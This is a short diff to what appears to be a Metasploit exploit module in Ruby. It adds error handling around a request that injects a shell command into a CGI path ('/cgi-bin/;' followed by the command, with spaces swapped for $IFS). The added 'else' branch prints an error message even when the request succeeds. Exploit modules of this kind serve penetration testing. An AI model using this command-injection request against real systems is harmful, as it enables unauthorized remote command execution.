@@ -70,7 +70,18 @@ end
 
     #replace spaces with $IFS in CMD
     cmd = cmd.gsub! ' ', '$IFS'
-    #send the request containing the edited command
-    send_request_raw({'uri' => "/cgi-bin/;#{cmd}"})
+    
+    begin
+      #send the request containing the edited command
+      send_request_raw({'uri' => "/cgi-bin/;#{cmd}"})
+    rescue Rex::ConnectionTimeout
+      print_error("Connection timed out to #{rhost}")
+    rescue Rex::ConnectionError
+      print_error("Error connecting to #{rhost}")
+    rescue Rex::ConnectionRefused
+      print_error("Connection refused to #{rhost}")
+    else
+      print_error("An error occured")
+    end
   end
 end
